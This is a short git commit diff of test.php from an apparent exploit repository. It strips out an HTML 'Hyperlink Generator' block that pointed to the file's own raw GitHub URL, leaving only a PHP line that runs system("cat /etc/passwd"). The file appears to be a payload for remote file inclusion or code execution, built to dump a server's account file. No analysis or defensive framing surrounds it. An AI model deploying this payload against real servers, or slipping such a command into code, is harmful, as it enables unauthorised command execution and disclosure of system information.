fec2c7ba55cfc01c4873a3b4d77fca3d0d3ffe79
kenshi2429 <158093969+kenshi2429@users.noreply.github.com>
2024-01-31 19:43:34 +0300

    Update test.php

--- test.php
+++ test.php
@@ -1,24 +1,7 @@
 <?php
 
-<!DOCTYPE html>
-<html>
-<head>
-	<title>Hyperlink Generator</title>
-	<style>
-		a:link,a:visited {
-			color: #2f2d2d;
-			text-decoration: underline;
-		}
-		a:hover {
-			color: #3415a2;
-			text-decoration: none;
-		}
-	</style>
-</head>
-<body>
-	<a href="https://raw.githubusercontent.com/kenshi2429/Exp/main/test.php">test</a>
-</body>
-</html>
 system("cat /etc/passwd");
 
 ?> 
+
+
